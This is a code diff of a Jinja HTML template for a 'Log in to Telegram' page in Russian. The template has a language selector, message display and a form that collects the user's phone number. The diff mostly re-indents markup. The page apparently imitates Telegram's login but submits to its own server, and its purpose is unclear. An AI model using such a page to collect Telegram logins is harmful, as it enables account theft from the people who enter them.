@@ -7,35 +7,37 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo"></div>
-        <h1>Войти в Telegram</h1>
-        
-        <!-- Выбор языка -->
-        <form method="GET" id="language-form" style="margin-bottom: 20px;">
-            <label for="language-select">Выберите язык:</label>
-            <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
-                <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
-                <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
-                <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
-                <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
-                <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
-                <!-- Добавляй другие языки по желанию -->
-            </select>
-        </form>
+    <div class="logo"></div>
+    <h1>Войти в Telegram</h1>
+    <p style="font-size: small; margin-top: 10px;">Проверьте код страны и введите номер телефона</p>
 
-        {% if error %}
-            <p class="error">{{ error }}</p>
-        {% elif success %}
-            <p class="success">{{ success }}</p>
-        {% endif %}
+    <!-- Выбор языка -->
+    <form method="GET" id="language-form" style="margin-bottom: 20px;">
+        <label for="language-select">Выберите язык:</label>
+        <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
+            <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
+            <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
+            <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
+            <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
+            <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
+            <!-- Добавляй другие языки по желанию -->
+        </select>
+    </form>
 
-        {% if stage == "phone" %}
-        <form method="POST">
-            <input type="hidden" name="lang" value="{{ lang }}">
-            <input type="text" name="phone" placeholder="Введите номер телефона" required>
-            <label><input type="checkbox" name="remember_me"> Запомнить меня</label>
-            <button type="submit">Далее</button>
-        </form>
+    {% if error %}
+        <p class="error">{{ error }}</p>
+    {% elif success %}
+        <p class="success">{{ success }}</p>
+    {% endif %}
+
+    {% if stage == "phone" %}
+    <form method="POST">
+        <input type="hidden" name="lang" value="{{ lang }}">
+        <input type="text" name="phone" placeholder="Введите номер телефона" required>
+        <label><input type="checkbox" name="remember_me"> Запомнить меня</label>
+        <button type="submit">Далее</button>
+    </form>
+
 
         <p style="font-size: small; margin-top: 10px;">Проверьте код страны и введите номер телефона</p>
 
